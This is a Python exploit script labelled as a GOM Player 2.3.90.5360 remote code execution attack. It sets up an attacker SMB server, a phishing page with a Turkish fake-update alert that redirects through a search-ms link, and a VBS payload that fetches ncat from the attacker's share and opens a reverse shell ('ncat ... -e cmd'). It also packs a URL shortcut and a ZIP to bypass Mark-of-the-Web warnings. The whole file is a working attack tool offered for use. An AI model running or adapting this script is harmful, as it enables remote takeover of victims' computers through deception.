import time
import os
import zipfile
import subprocess
import socket
import sys

banner = """\033[38;5;196m+-----------------------------------------------------------+
|     GOM Player 2.3.90.5360 - Remote Code Execution        |
|
+-----------------------------------------------------------+\033[0m""" +"""
\033[38;5;117m[*]- HackersFLOW, + A7XY The Bot\n\033[0m"""

print(banner)

if os.geteuid() != 0:
    print("You need root privileges to run the exploit, please use sudo...")
    sys.exit(1)

targetIP = input("- Target IP address: ")
listenPort = input("- Listening port for Reverse Shell: ")

def fCreate(fileName, fileContent): 
    f = open(fileName, "w")
    f.write(fileContent)
    f.close()


gateway = input("- Gateway IP address: ")
host = input("- Host name: ")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((gateway, 0))
ipaddr = input("Enter Your Listening Host: ")

print("- My IP:", ipaddr, " Gateway:", gateway, " Host:", host) 

print("\n[*]- Stage 1: Downloading necessary tools...")

smbFolderName = "GomUpdater"
expWorkDir = "gomExploitDir"
os.system("mkdir " + expWorkDir + " >/dev/null 2>&1 &")
time.sleep(1)
os.system("cd " + expWorkDir + " && mkdir smb-shared web-shared >/dev/null 2>&1 &")
time.sleep(1)
os.system("cd " + expWorkDir + "/smb-shared && wget https://nmap.org/dist/ncat-portable-5.59BETA1.zip >/dev/null 2>&1 && unzip -o -j ncat-portable-5.59BETA1.zip >/dev/null 2>&1 && rm -rf ncat-portable-5.59BETA1.zip README")
print("    [*] - Ncat has been downloaded.")
subprocess.run("git clone https://github.com/fortra/impacket.git " + expWorkDir + "/impacket >/dev/null 2>&1", shell=True)
print("    [*] - Impacket has been downloaded.")
subprocess.run("git clone https://github.com/dtrecherel/DNSSpoof.git " + expWorkDir + "/dnsspoof >/dev/null 2>&1", shell=True)
print("    [*] - DNSSpoof.py has been downloaded.")

print("[*]- Stage 2: Creating Attacker SMB Server...")
subprocess.Popen("cd " + expWorkDir + "/impacket/examples && python3 smbserver.py " + smbFolderName + " ../../smb-shared -smb2support >/dev/null 2>&1", shell=True)
time.sleep(5)

smbIP = ipaddr
spoofUrl = "playinfo.gomlab.com"

print("[*]- Stage 3: Creating Attacker Web Page...")

screenExpPage = """
<meta charset="utf-8">
<script> window.alert("GOM Player için acil güncelleme yapılmalı ! Açılan pencerede lütfen updater'a tıklayın.");</script>
<script>window.location.href= 'search-ms:displayname=GOM Player Updater&crumb=System.Generic.String%3AUpdater&crumb=location:%5C%5C""" + smbIP + """';
</script>
"""

fCreate(expWorkDir + "/web-shared/screen.html", screenExpPage)
time.sleep(3)

print("[*]- Stage 4: Creating URL+VBS for MoTW bypass placing it into the ZIP archive...")
vbsCommand = '''Set shell=CreateObject("wscript.shell")
Shell.Run("xcopy /y \\\\yogurt\\ayran\\ncat.exe %temp%")
WScript.Sleep 5000
Shell.Run("cmd /c start /min cmd /c %temp%\\ncat.exe attackerIP attackerPort -e cmd")'''

vbsCommand = vbsCommand.replace("yogurt", smbIP).replace("ayran", smbFolderName).replace("attackerIP", smbIP).replace("attackerPort", listenPort)
fCreate(expWorkDir + "/payload.vbs", vbsCommand)

urlShortcut = '''[InternetShortcut]
URL=file://''' + smbIP + "/" + smbFolderName + '''/archive.zip/payload.vbs
IDlist='''

fCreate(expWorkDir + "/smb-shared/Updater.url", urlShortcut)
time.sleep(3)
zipName = expWorkDir + "/smb-shared/archive.zip"
payload_filename = os.path.join(expWorkDir, "payload.vbs")

with zipfile.ZipFile(zipName, "w") as zipFile:
    zipFile.write(payload_filename, arcname="payload.vbs")

print("[*]- Stage 5: Exploitation Setup Complete.")
print("    [*] - SMB Server is running at:", smbIP)
print("    [*] - Web Page is hosted at:", smbIP)
print("    [*] - ZIP Archive is ready at:", zipName)

print("\n[*]- Exploit Ready. Please follow the steps below:")
print("  1. Copy the ZIP archive 'archive.zip' to the target machine.")
print("  2. Run the 'screen.html' web page on the target machine.")
print("  3. Extract and execute the 'payload.vbs' script within the ZIP archive.")

print("\n[*] - Exploit completed.")
